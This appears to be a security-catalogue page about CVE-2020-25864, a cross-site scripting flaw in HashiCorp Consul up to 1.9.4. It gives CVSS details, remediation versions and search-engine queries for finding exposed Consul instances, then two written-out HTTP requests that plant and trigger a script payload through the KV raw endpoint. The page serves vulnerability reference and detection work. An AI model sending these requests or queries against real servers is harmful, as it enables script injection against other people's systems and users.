---
layout: post
cve_id: CVE-2020-25864
title: HashiCorp Consul/Consul Enterprise <=1.9.4 - Cross-Site Scripting
pcap: true
pcap_path: /pcaps/2020/CVE-2020-25864.pcap
nuclei_url: https://github.com/packetinside/nuclei-templates/blob/main/http/cves/2020/CVE-2020-25864.yaml
snort2_rule: N/A
snort3_rule: N/A
author: c-sh0
severity: medium
impact: 'Successful exploitation of this vulnerability could allow an attacker to
  execute arbitrary JavaScript code in the context of the victim''s browser, leading
  to potential data theft, session hijacking, or defacement of the affected Consul/Consul
  Enterprise application.

  '
remediation: Fixed in 1.9.5, 1.8.10 and 1.7.14.
reference:
- https://discuss.hashicorp.com/t/hcsec-2021-07-consul-api-kv-endpoint-vulnerable-to-cross-site-scripting/23368
- https://www.hashicorp.com/blog/category/consul
- https://nvd.nist.gov/vuln/detail/CVE-2020-25864
- https://security.gentoo.org/glsa/202208-09
- https://github.com/ARPSyndicate/cvemon
classification:
  cvss-metrics: CVSS:3.1/AV:N/AC:L/PR:N/UI:R/S:C/C:L/I:L/A:N
  cvss-score: 6.1
  cve-id: CVE-2020-25864
  cwe-id: CWE-79
  epss-score: 0.85106
  epss-percentile: 0.99319
  cpe: cpe:2.3:a:hashicorp:consul:*:*:*:*:-:*:*:*
metadata:
  max-request: 2
  vendor: hashicorp
  product: consul
  shodan-query:
  - http.title:"consul by hashicorp"
  - cpe:"cpe:2.3:a:hashicorp:consul"
  fofa-query: title="consul by hashicorp"
  google-query: intitle:"consul by hashicorp"
tags:
- cve
- cve2020
- consul
- xss
- intrusive
- hashicorp
- vuln
---

## ðŸ” Vulnerability Description
HashiCorp Consul and Consul Enterprise up to version 1.9.4 are vulnerable to cross-site scripting via the key-value (KV) raw mode.


## ðŸŒ HTTP Request
```nohighlight
PUT /v1/kv/38FSlduerLXHMh6uCRPhlR8UCfw HTTP/1.1
Host: www.victim.com
User-Agent: Mozilla/5.0 (Macintosh; Intel Mac OS X 10_10) AppleWebKit/537.36 (KHTML, like Gecko) Version/8.0 Safari/537.36
Connection: close
Content-Length: 54
Accept-Encoding: gzip
<!DOCTYPE html><script>alert(document.domain)</script>
```

```nohighlight
GET /v1/kv/38FSlduerLXHMh6uCRPhlR8UCfw?raw HTTP/1.1
Host: www.victim.com
User-Agent: Mozilla/5.0 (Macintosh; Intel Mac OS X 10_15_7) AppleWebKit/605.1.15 (KHTML, like Gecko) Version/17.1.2 Safari/605.1.15
Connection: close
Accept-Encoding: gzip
```

